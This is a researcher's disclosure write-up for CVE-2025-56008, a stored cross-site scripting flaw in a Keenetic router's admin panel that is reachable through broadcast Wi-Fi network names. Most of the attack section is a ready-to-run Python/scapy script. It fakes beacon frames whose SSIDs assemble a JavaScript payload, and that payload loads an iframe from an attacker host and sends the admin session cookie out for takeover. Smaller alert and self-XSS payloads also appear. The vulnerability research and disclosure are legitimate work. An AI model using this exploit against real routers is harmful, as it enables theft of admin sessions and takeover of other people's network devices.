## CVE-2025-56008

### Discovery

This is yet another CVE that I've found in my router's admin panel.

The discovery was very simple: I named my access point like `std::allocator<void>(5GHz)` as a joke and accidentally found that the `<void>` portion was not displayed in the network name on the Wireless ISP page.

However, it was not so easy to turn this into something interesting.

### Exploitation

Just to confirm the issue, I used a short payload: `<style onload=alert(1)//`. After the admin page loaded while an access point with that name was in range, the `alert(1)` is executed.

But what about real attack? :)

The main problem for executing anything interesting was the SSID length limit of 32 characters. To bypass this, I broadcast a list of networks that assemble the payload step by step by storing fragments in JavaScript variables.

The second problem was the order in which networks are rendered. I overcame this by first broadcasting several networks with basic payload fragments and then - after about five seconds - broadcasting the final network that assembles and executes the payload.

The chosen payload exfiltrates `document.cookie` to an attacker-controlled endpoint via `postMessage`. With the stolen authentication cookie an attacker could obtain persistent administrative access (for example, by changing the admin password or creating a new admin user).

Here is the script that will create a list of networks that load the script from attacker-controlled server. It assumes that you already put your adapter `wlp6s0mon` in monitor mode (`sudo airmon-ng start [adapter]`):

```python
import time

from scapy.all import *
from threading import Thread
from faker import Faker


s = 0


def send_beacon(ssid, mac, count=1_000_000_000):
    global s

    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy", timestamp=123)
    s += 1
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID='Rates', info='\x82\x84\x8b\x96\x0c\x12\x18') / \
        Dot11Elt(ID='ESRates', info='\x30\x48\x60\x6c') / Dot11Elt(ID='DSset', info=chr([9, 10, 11][s % 3]))
    rsn_array = [b'\x01\x00',
                 b'\x00\x0f\xac\x04',
                 b'\x02\x00',
                 b'\x00\x0f\xac\x04',
                 b'\x00\x0f\xac\x02',
                 b'\x01\x00',
                 b'\x00\x0f\xac\x02',
                 b'\x00\x00']
    rsn_bytes = b''.join(rsn_array)
    rsn = Dot11Elt(ID='RSNinfo', info=rsn_bytes, len=len(rsn_bytes))
    frame = RadioTap()/dot11/beacon/essid/rsn

    sendp(frame, inter=0.05, loop=1, iface=iface, verbose=0, count=count)


if __name__ == "__main__":
    iface = "wlp6s0mon"

    input_ssids = [
        """<style onload=a='*'//""",  # 21
        """<style onload=b='postMessage'//""",  # 31
        """<style onload=c=document//""",  # 26
        """<style onload=d='cookie'//""",  # 26
        """<style onload=e=frames//""",  # 24
        """<iframe src=//MY_SITE/b name="u\"""",  # 32
    ]
    last_ssid = """<style onload=e.u[b](c[d],a)//"""  # 30

    input_ssids += [last_ssid]

    assert all(len(i) <= 32 for i in input_ssids)
    print('\n'.join(input_ssids))

    faker = Faker()
    ssids_macs = [(i, faker.mac_address()) for i in input_ssids]

    for ssid, mac in ssids_macs:
        time.sleep(0.05)
        Thread(target=send_beacon, args=(ssid, mac)).start()

    while True:
        time.sleep(1)
        Thread(target=send_beacon, args=(last_ssid, faker.mac_address()), kwargs={'count': 50}).start()
```

Here is a short explaination:

-   `a = '\*'`
-   `b = 'postMessage'`
-   `c = document`
-   `d = 'cookie'`
-   `e = frames`
-   `e.u[b](c[d],a) = frames.u['postMessage'](document['cookie'],'*')` - "get iframe with name 'u' and send document.cookie via postmessage to it".

### Bonus

Names of this router's home/guest Wi-Fi nets were also affected by XSS, so we have a self-XSS here with payload like `<img src=x onerror=alert()>`. It is useless for attacks, but may be useful for "persistence".

### Links

-   CVE record: https://www.cve.org/CVERecord?id=CVE-2025-56008
-   Keenetic security advisory: https://keenetic.com/global/security#october-2025-web-api-vulnerabilities
